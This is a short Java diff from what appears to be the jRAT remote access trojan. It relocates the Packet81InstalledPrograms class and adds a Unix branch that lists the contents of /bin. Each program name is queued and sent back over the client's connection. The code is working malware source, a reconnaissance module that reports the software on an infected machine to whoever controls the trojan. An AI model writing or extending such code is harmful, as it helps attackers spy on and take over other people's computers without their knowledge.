@@ -1,7 +1,7 @@
-package jrat.client.packets.incoming;
+package jrat.module.system.packets;
 
 import jrat.client.Connection;
-import jrat.client.packets.outgoing.Packet55InstalledProgram;
+import jrat.client.packets.incoming.IncomingPacket;
 import oslib.OperatingSystem;
 
 import java.io.BufferedReader;
@@ -54,7 +54,13 @@ public class Packet81InstalledPrograms implements IncomingPacket {
 						con.addToSendQueue(new Packet55InstalledProgram(name));
 					}
 				}
-			}
+			} else if (OperatingSystem.isUnix()) {
+			    File[] bins = new File("/bin").listFiles();
+
+			    for (File bin : bins) {
+			        con.addToSendQueue(new Packet55InstalledProgram(bin.getName()));
+                }
+            }
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
